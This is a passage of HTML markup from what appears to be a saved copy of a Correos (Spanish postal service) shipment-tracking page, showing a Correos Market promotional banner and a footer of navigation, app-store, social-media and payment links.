											<correos-cdk-full-content-photo paragraph="Descubre Correos Market, el marketplace de Correos que apuesta por las empresas españolas y productores artesanos que venden sin comisiones ni intermediarios. Así de sencillo." theme="inverse" buttontext="COMPRA EN CORREOS MARKET" varianttype="bannerImage" bgimage="./files/img/Banner-Correos-Market-modulo-localizador-Correos-1440x960.jpg" buttonhref="https://www.market.correos.es/?utm_source=web_correos&amp;utm_medium=localizador_envio&amp;utm_campaign=CMk_correos_market_generico&amp;utm_term=oct_22" button2type="link" title="Compra productos de empresas españolas" variant="default" cqtype="correos/reactcomponents/CorreosCdkFullContentPhoto" cqpath="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/responsivegrid/correoscdkfullconten_311029731" isineditor="false" componentproperties="[object Object]" button-text="COMPRA EN CORREOS MARKET" variant-type="bannerImage" bg-image="./files/img/Banner-Correos-Market-modulo-localizador-Correos-1440x960.jpg" button-href="https://www.market.correos.es/?utm_source=web_correos&amp;utm_medium=localizador_envio&amp;utm_campaign=CMk_correos_market_generico&amp;utm_term=oct_22" button2-type="link" cq-type="correos/reactcomponents/CorreosCdkFullContentPhoto" cq-path="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/responsivegrid/correoscdkfullconten_311029731" class="sc-correos-cdk-full-content-photo-h sc-correos-cdk-full-content-photo-s hydrated" decorator-src="images/deco_03.svg" size="xs">
												<!---->
												<div class="cdk-img sc-correos-cdk-full-content-photo" style="background-image: url(&quot;files/img/Banner-Correos-Market-modulo-localizador-Correos-1440x960.jpg&quot;);">
												</div>
												<div class="cdk-content sc-correos-cdk-full-content-photo sc-correos-cdk-full-content-photo-s">
													<div class="cdk-textblock sc-correos-cdk-full-content-photo sc-correos-cdk-full-content-photo-s">
														<correos-ui-text-inf class="sc-correos-cdk-full-content-photo sc-correos-ui-text-inf-h sc-correos-ui-text-inf-s hydrated" size="xs">
															<!---->
															<div class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																<div id="titleId" class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s" style="color: var(--_ui-text-inf-color-title);">
																	<h1 slot="title" class="sc-correos-cdk-full-content-photo">Compra
																		productos de empresas españolas</h1>
																</div>
																<p slot="text" class="sc-correos-cdk-full-content-photo">Descubre
																	Correos Market, el marketplace de Correos que
																	apuesta por las empresas españolas y productores
																	artesanos que venden sin comisiones ni
																	intermediarios. Así de sencillo.</p>
																<div class="ui-link sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																</div>
															</div>
														</correos-ui-text-inf>
													</div>
												</div>
											</correos-cdk-full-content-photo>
											<div></div>
										</div>

									</div>
									<div></div>
								</div>
								<div class="  aem-GridColumn aem-GridColumn--default--12" style="position: absolute; width: 100%; z-index: 0;">
									<correos-cdk-core-footer textfooter="©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados." liteversion="false" imgfooter="/content/dam/correos/imagenes/iconos/pie/ico-splash.svg" altfooter="Correos" linkslist="[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Política de cookies&quot;,&quot;titleLink&quot;:&quot;Ir a Política de cookies&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/politica-de-cookies&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Aviso legal&quot;,&quot;titleLink&quot;:&quot;Ir a Aviso legal&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/aviso-legal&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Privacidad web&quot;,&quot;titleLink&quot;:&quot;Ir a Privacidad web&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/privacidad-web&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Alerta seguridad&quot;,&quot;titleLink&quot;:&quot;Ir a Alerta seguridad&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/alerta-de-seguridad&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Accesibilidad&quot;,&quot;titleLink&quot;:&quot;Ir a Accesibilidad&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/accesibilidad&quot;}]" itemlist="[{&quot;textTitle&quot;:&quot;Para ti &quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Seguimiento de envío&quot;,&quot;titleLink&quot;:&quot;Ir a Seguimiento de envío&quot;,&quot;hrefLink&quot;:&quot;/es/es/herramientas/localizador/envios&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Recibir&quot;,&quot;titleLink&quot;:&quot;Ir a Recibir&quot;,&quot;hrefLink&quot;:&quot;/es/es/particulares/recibir&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Enviar&quot;,&quot;titleLink&quot;:&quot;Ir a Enviar&quot;,&quot;hrefLink&quot;:&quot;/es/es/particulares/enviar&quot;}]},{&quot;textTitle&quot;:&quot;Para tu empresa&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Enviar&quot;,&quot;titleLink&quot;:&quot;Ir a Enviar&quot;,&quot;hrefLink&quot;:&quot;/es/es/empresas/enviar&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Ecommerce&quot;,&quot;titleLink&quot;:&quot;Ir a Ecommerce&quot;,&quot;hrefLink&quot;:&quot;/es/es/empresas/ecommerce&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Marketing&quot;,&quot;titleLink&quot;:&quot;Ir a Marketing&quot;,&quot;hrefLink&quot;:&quot;/es/es/empresas/marketing&quot;}]},{&quot;textTitle&quot;:&quot;Para tu interés&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;textLink&quot;:&quot;Filatelia&quot;,&quot;titleLink&quot;:&quot;Ir a Filatelia&quot;,&quot;hrefLink&quot;:&quot;/es/es/particulares/ocio-y-viajes/sellos-y-filatelia&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;textLink&quot;:&quot;Correos Market&quot;,&quot;titleLink&quot;:&quot;Ir a Correos Market&quot;,&quot;hrefLink&quot;:&quot;https://www.market.correos.es/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;textLink&quot;:&quot;Web institucional&quot;,&quot;titleLink&quot;:&quot;Ir a Web institucional&quot;,&quot;hrefLink&quot;:&quot;https://www.correos.com/?_ga=2.48058663.1272337042.1602486055-1925384938.1602155804&quot;}]}]" speciallist="[{&quot;rrssTitle&quot;:&quot;&quot;,&quot;linksIcon&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-facebook&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Facebook&quot;,&quot;hrefLink&quot;:&quot;https://www.facebook.com/correos.es&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-instagram&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Instagram&quot;,&quot;hrefLink&quot;:&quot;https://www.instagram.com/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-twitter&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Twitter&quot;,&quot;hrefLink&quot;:&quot;https://twitter.com/correos&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-linkedin&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Linkedin&quot;,&quot;hrefLink&quot;:&quot;https://www.linkedin.com/company/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-youtube&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Youtube&quot;,&quot;hrefLink&quot;:&quot;https://www.youtube.com/user/CanalCorreos&quot;}],&quot;icon&quot;:&quot;icon-contact&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Atención al cliente&quot;,&quot;titleLink&quot;:&quot;Ir a Atención al cliente&quot;,&quot;hrefLink&quot;:&quot;/es/es/atencion-al-cliente&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Encuentra tu oficina&quot;,&quot;titleLink&quot;:&quot;Ir a Encuentra tu oficina&quot;,&quot;hrefLink&quot;:&quot;/es/es/herramientas/oficinas-buzones-citypaq/detalle&quot;}]}]" applist="[{&quot;textTitle&quot;:&quot;Descarga la App de Correos&quot;,&quot;buttons&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/home/apps/apple_store.jpg&quot;,&quot;imageAlt&quot;:&quot;App Store&quot;,&quot;titleLink&quot;:&quot;Ir a Ir a App Store&quot;,&quot;hrefLink&quot;:&quot;https://apps.apple.com/app/correos-info/id486322953&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/home/apps/google_play.jpg&quot;,&quot;imageAlt&quot;:&quot;Google Play&quot;,&quot;titleLink&quot;:&quot;Ir a Ir a Google Play&quot;,&quot;hrefLink&quot;:&quot;https://play.google.com/store/apps/details?id=es.correos.widget&amp;hl=es&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/ilustraciones/logos/huawei.svg&quot;,&quot;imageAlt&quot;:&quot;Haweii&quot;,&quot;titleLink&quot;:&quot;Ir a Ir a Haweii&quot;,&quot;hrefLink&quot;:&quot;https://appgallery.huawei.com/#/app/C102638007?pkgName=es.correos.widget&amp;channelId=i&amp;referrer=&amp;detailType=0&amp;callType=AGDLINK&quot;}]}]" paylist="[{&quot;payImage&quot;:[{&quot;imageURL&quot;:&quot;/content/dam/prepago/imagenes/logos/logo-mastercard.png&quot;,&quot;imageAlt&quot;:&quot;MasterCard&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/paypal.svg.svg&quot;,&quot;imageAlt&quot;:&quot;PayPal&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/maestro.svg&quot;,&quot;imageAlt&quot;:&quot;Maestro&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/visa.svg&quot;,&quot;imageAlt&quot;:&quot;Visa&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/log amex.svg&quot;,&quot;imageAlt&quot;:&quot;American Express&quot;}],&quot;textTitle&quot;:&quot;Métodos de pago&quot;}]" certificatelist="[{&quot;textTitle&quot;:&quot;Certificados&quot;,&quot;certificate&quot;:[{&quot;isLink&quot;:false,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/w3c.svg&quot;,&quot;imageAlt&quot;:&quot;w3c&quot;}]}]" rrssversion="false" rrsslist="{&quot;rrssTitle&quot;:&quot;&quot;,&quot;linksIcon&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-facebook&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Facebook&quot;,&quot;hrefLink&quot;:&quot;https://www.facebook.com/correos.es&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-instagram&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Instagram&quot;,&quot;hrefLink&quot;:&quot;https://www.instagram.com/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-twitter&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Twitter&quot;,&quot;hrefLink&quot;:&quot;https://twitter.com/correos&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-linkedin&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Linkedin&quot;,&quot;hrefLink&quot;:&quot;https://www.linkedin.com/company/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-youtube&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Youtube&quot;,&quot;hrefLink&quot;:&quot;https://www.youtube.com/user/CanalCorreos&quot;}],&quot;icon&quot;:&quot;icon-contact&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Atención al cliente&quot;,&quot;titleLink&quot;:&quot;Ir a Atención al cliente&quot;,&quot;hrefLink&quot;:&quot;/es/es/atencion-al-cliente&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Encuentra tu oficina&quot;,&quot;titleLink&quot;:&quot;Ir a Encuentra tu oficina&quot;,&quot;hrefLink&quot;:&quot;/es/es/herramientas/oficinas-buzones-citypaq/detalle&quot;}]}" contactmoduleliterals="[]" newsletterliterals="[]" cqtype="correos/reactcomponents/CorreosCdkCoreFooter" cqpath="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/correoscdkcorefooter" isineditor="false" componentproperties="[object Object]" text-footer="©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados." lite-version="false" img-footer="/content/dam/correos/imagenes/iconos/pie/ico-splash.svg" alt-footer="Correos" links-list="[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Política de cookies&quot;,&quot;titleLink&quot;:&quot;Ir a Política de cookies&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/politica-de-cookies&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Aviso legal&quot;,&quot;titleLink&quot;:&quot;Ir a Aviso legal&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/aviso-legal&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Privacidad web&quot;,&quot;titleLink&quot;:&quot;Ir a Privacidad web&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/privacidad-web&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Alerta seguridad&quot;,&quot;titleLink&quot;:&quot;Ir a Alerta seguridad&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/alerta-de-seguridad&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Accesibilidad&quot;,&quot;titleLink&quot;:&quot;Ir a Accesibilidad&quot;,&quot;urlLink&quot;:&quot;/es/es/legales/accesibilidad&quot;}]" item-list="[{&quot;textTitle&quot;:&quot;Para ti &quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Seguimiento de envío&quot;,&quot;titleLink&quot;:&quot;Ir a Seguimiento de envío&quot;,&quot;hrefLink&quot;:&quot;/es/es/herramientas/localizador/envios&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Recibir&quot;,&quot;titleLink&quot;:&quot;Ir a Recibir&quot;,&quot;hrefLink&quot;:&quot;/es/es/particulares/recibir&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Enviar&quot;,&quot;titleLink&quot;:&quot;Ir a Enviar&quot;,&quot;hrefLink&quot;:&quot;/es/es/particulares/enviar&quot;}]},{&quot;textTitle&quot;:&quot;Para tu empresa&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Enviar&quot;,&quot;titleLink&quot;:&quot;Ir a Enviar&quot;,&quot;hrefLink&quot;:&quot;/es/es/empresas/enviar&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Ecommerce&quot;,&quot;titleLink&quot;:&quot;Ir a Ecommerce&quot;,&quot;hrefLink&quot;:&quot;/es/es/empresas/ecommerce&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Marketing&quot;,&quot;titleLink&quot;:&quot;Ir a Marketing&quot;,&quot;hrefLink&quot;:&quot;/es/es/empresas/marketing&quot;}]},{&quot;textTitle&quot;:&quot;Para tu interés&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;textLink&quot;:&quot;Filatelia&quot;,&quot;titleLink&quot;:&quot;Ir a Filatelia&quot;,&quot;hrefLink&quot;:&quot;/es/es/particulares/ocio-y-viajes/sellos-y-filatelia&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;textLink&quot;:&quot;Correos Market&quot;,&quot;titleLink&quot;:&quot;Ir a Correos Market&quot;,&quot;hrefLink&quot;:&quot;https://www.market.correos.es/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;textLink&quot;:&quot;Web institucional&quot;,&quot;titleLink&quot;:&quot;Ir a Web institucional&quot;,&quot;hrefLink&quot;:&quot;https://www.correos.com/?_ga=2.48058663.1272337042.1602486055-1925384938.1602155804&quot;}]}]" special-list="[{&quot;rrssTitle&quot;:&quot;&quot;,&quot;linksIcon&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-facebook&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Facebook&quot;,&quot;hrefLink&quot;:&quot;https://www.facebook.com/correos.es&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-instagram&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Instagram&quot;,&quot;hrefLink&quot;:&quot;https://www.instagram.com/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-twitter&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Twitter&quot;,&quot;hrefLink&quot;:&quot;https://twitter.com/correos&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-linkedin&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Linkedin&quot;,&quot;hrefLink&quot;:&quot;https://www.linkedin.com/company/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-youtube&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Youtube&quot;,&quot;hrefLink&quot;:&quot;https://www.youtube.com/user/CanalCorreos&quot;}],&quot;icon&quot;:&quot;icon-contact&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Atención al cliente&quot;,&quot;titleLink&quot;:&quot;Ir a Atención al cliente&quot;,&quot;hrefLink&quot;:&quot;/es/es/atencion-al-cliente&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Encuentra tu oficina&quot;,&quot;titleLink&quot;:&quot;Ir a Encuentra tu oficina&quot;,&quot;hrefLink&quot;:&quot;/es/es/herramientas/oficinas-buzones-citypaq/detalle&quot;}]}]" app-list="[{&quot;textTitle&quot;:&quot;Descarga la App de Correos&quot;,&quot;buttons&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/home/apps/apple_store.jpg&quot;,&quot;imageAlt&quot;:&quot;App Store&quot;,&quot;titleLink&quot;:&quot;Ir a Ir a App Store&quot;,&quot;hrefLink&quot;:&quot;https://apps.apple.com/app/correos-info/id486322953&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/home/apps/google_play.jpg&quot;,&quot;imageAlt&quot;:&quot;Google Play&quot;,&quot;titleLink&quot;:&quot;Ir a Ir a Google Play&quot;,&quot;hrefLink&quot;:&quot;https://play.google.com/store/apps/details?id=es.correos.widget&amp;hl=es&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/ilustraciones/logos/huawei.svg&quot;,&quot;imageAlt&quot;:&quot;Haweii&quot;,&quot;titleLink&quot;:&quot;Ir a Ir a Haweii&quot;,&quot;hrefLink&quot;:&quot;https://appgallery.huawei.com/#/app/C102638007?pkgName=es.correos.widget&amp;channelId=i&amp;referrer=&amp;detailType=0&amp;callType=AGDLINK&quot;}]}]" pay-list="[{&quot;payImage&quot;:[{&quot;imageURL&quot;:&quot;/content/dam/prepago/imagenes/logos/logo-mastercard.png&quot;,&quot;imageAlt&quot;:&quot;MasterCard&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/paypal.svg.svg&quot;,&quot;imageAlt&quot;:&quot;PayPal&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/maestro.svg&quot;,&quot;imageAlt&quot;:&quot;Maestro&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/visa.svg&quot;,&quot;imageAlt&quot;:&quot;Visa&quot;},{&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/log amex.svg&quot;,&quot;imageAlt&quot;:&quot;American Express&quot;}],&quot;textTitle&quot;:&quot;Métodos de pago&quot;}]" certificate-list="[{&quot;textTitle&quot;:&quot;Certificados&quot;,&quot;certificate&quot;:[{&quot;isLink&quot;:false,&quot;imageURL&quot;:&quot;/content/dam/correos/imagenes/iconos/pie/w3c.svg&quot;,&quot;imageAlt&quot;:&quot;w3c&quot;}]}]" rrss-version="false" rrss-list="{&quot;rrssTitle&quot;:&quot;&quot;,&quot;linksIcon&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-facebook&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Facebook&quot;,&quot;hrefLink&quot;:&quot;https://www.facebook.com/correos.es&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-instagram&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Instagram&quot;,&quot;hrefLink&quot;:&quot;https://www.instagram.com/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-twitter&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Twitter&quot;,&quot;hrefLink&quot;:&quot;https://twitter.com/correos&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-linkedin&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Linkedin&quot;,&quot;hrefLink&quot;:&quot;https://www.linkedin.com/company/correos/&quot;},{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-youtube&quot;,&quot;labelLink&quot;:&quot;Ir a Ir a Youtube&quot;,&quot;hrefLink&quot;:&quot;https://www.youtube.com/user/CanalCorreos&quot;}],&quot;icon&quot;:&quot;icon-contact&quot;,&quot;links&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Atención al cliente&quot;,&quot;titleLink&quot;:&quot;Ir a Atención al cliente&quot;,&quot;hrefLink&quot;:&quot;/es/es/atencion-al-cliente&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;textLink&quot;:&quot;Encuentra tu oficina&quot;,&quot;titleLink&quot;:&quot;Ir a Encuentra tu oficina&quot;,&quot;hrefLink&quot;:&quot;/es/es/herramientas/oficinas-buzones-citypaq/detalle&quot;}]}" contact-module-literals="[]" newsletter-literals="[]" cq-type="correos/reactcomponents/CorreosCdkCoreFooter" cq-path="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/correoscdkcorefooter" class="sc-correos-cdk-core-footer-h sc-correos-cdk-core-footer-s hydrated" size="xs">
										<section class="cdk-section-dark sc-correos-cdk-core-footer">
											<div class="cdk-footer-container wrapper-main sc-correos-cdk-core-footer">
												<div class="cdk-white-footer sc-correos-cdk-core-footer">
													<ul class="cdk-container-links sc-correos-cdk-core-footer">
														<li class="cdk-white-list sc-correos-cdk-core-footer"><button class="cdk-white-list__btn sc-correos-cdk-core-footer" type="button" aria-label="Open Modal"><span class="sc-correos-cdk-core-footer">Para ti </span><i class="cdk-white-list__icon sc-correos-cdk-core-footer" data-icon="0"></i></button>
															<ul class="cdk-white-list__list sc-correos-cdk-core-footer" data-menu="0">
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.es/es/es/herramientas/localizador/envios.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Seguimiento de envío">Seguimiento de
																		envío</a>
																</li>
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.es/es/es/particulares/recibir.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Recibir">Recibir</a>
																</li>
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.es/es/es/particulares/enviar.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Enviar">Enviar</a>
																</li>
															</ul>
														</li>
														<li class="cdk-white-list sc-correos-cdk-core-footer"><button class="cdk-white-list__btn sc-correos-cdk-core-footer" type="button" aria-label="Open Modal"><span class="sc-correos-cdk-core-footer">Para tu
																	empresa</span><i class="cdk-white-list__icon sc-correos-cdk-core-footer" data-icon="1"></i></button>
															<ul class="cdk-white-list__list sc-correos-cdk-core-footer" data-menu="1">
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.es/es/es/empresas/enviar.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Enviar">Enviar</a>
																</li>
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.es/es/es/empresas/ecommerce.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Ecommerce">Ecommerce</a>
																</li>
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.es/es/es/empresas/marketing.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Marketing">Marketing</a>
																</li>
															</ul>
														</li>
														<li class="cdk-white-list sc-correos-cdk-core-footer"><button class="cdk-white-list__btn sc-correos-cdk-core-footer" type="button" aria-label="Open Modal"><span class="sc-correos-cdk-core-footer">Para tu
																	interés</span><i class="cdk-white-list__icon sc-correos-cdk-core-footer" data-icon="2"></i></button>
															<ul class="cdk-white-list__list sc-correos-cdk-core-footer" data-menu="2">
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.es/es/es/particulares/ocio-y-viajes/sellos-y-filatelia.html" target="_blank" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Filatelia">Filatelia</a>
																</li>
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.market.correos.es/" target="_blank" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Correos Market">Correos Market</a>
																</li>
																<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																	<a href="/www.correos.com/?_ga=2.48058663.1272337042.1602486055-1925384938.1602155804.html" target="_blank" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Web institucional">Web
																		institucional</a>
																</li>
															</ul>
														</li>
														<li class="cdk-white-list sc-correos-cdk-core-footer">
															<div class="cdk-white-list__container sc-correos-cdk-core-footer">
																<button class="cdk-white-list__btn sc-correos-cdk-core-footer" type="button" aria-label="Open Modal"><i class="icon-contact cdk-white-list__icon-title sc-correos-cdk-core-footer"></i><i class="cdk-white-list__icon sc-correos-cdk-core-footer" data-icon="3"></i></button>
																<ul class="cdk-white-list__list sc-correos-cdk-core-footer" data-menu="3">
																	<li class="cdk-white-list__item sc-correos-cdk-core-footer">
																		<a href="/www.correos.es/es/es/atencion-al-cliente.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Atención al cliente">Atención al
																			cliente</a>
																	</li>
																	<li class="cdk-white-list__item cdk-white-list__item--padding-bottom sc-correos-cdk-core-footer">
																		<a href="/www.correos.es/es/es/herramientas/oficinas-buzones-citypaq/detalle.html" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Encuentra tu oficina">Encuentra
																			tu oficina</a>
																	</li>
																</ul>
															</div>
															<div class="sc-correos-cdk-core-footer">
																<ul class="cdk-social sc-correos-cdk-core-footer">
																	<li class="cdk-social__item sc-correos-cdk-core-footer">
																		<a href="/www.facebook.com/correos.es.html" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Facebook" aria-label="Ir a Ir a Facebook"><i class="icon-facebook sc-correos-cdk-core-footer"></i></a>
																	</li>
																	<li class="cdk-social__item sc-correos-cdk-core-footer">
																		<a href="/www.instagram.com/correos/" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Instagram" aria-label="Ir a Ir a Instagram"><i class="icon-instagram sc-correos-cdk-core-footer"></i></a>
																	</li>
																	<li class="cdk-social__item sc-correos-cdk-core-footer">
																		<a href="/twitter.com/correos.html" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Twitter" aria-label="Ir a Ir a Twitter"><i class="icon-twitter sc-correos-cdk-core-footer"></i></a>
																	</li>
																	<li class="cdk-social__item sc-correos-cdk-core-footer">
																		<a href="/www.linkedin.com/company/correos/" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Linkedin" aria-label="Ir a Ir a Linkedin"><i class="icon-linkedin sc-correos-cdk-core-footer"></i></a>
																	</li>
																	<li class="cdk-social__item sc-correos-cdk-core-footer">
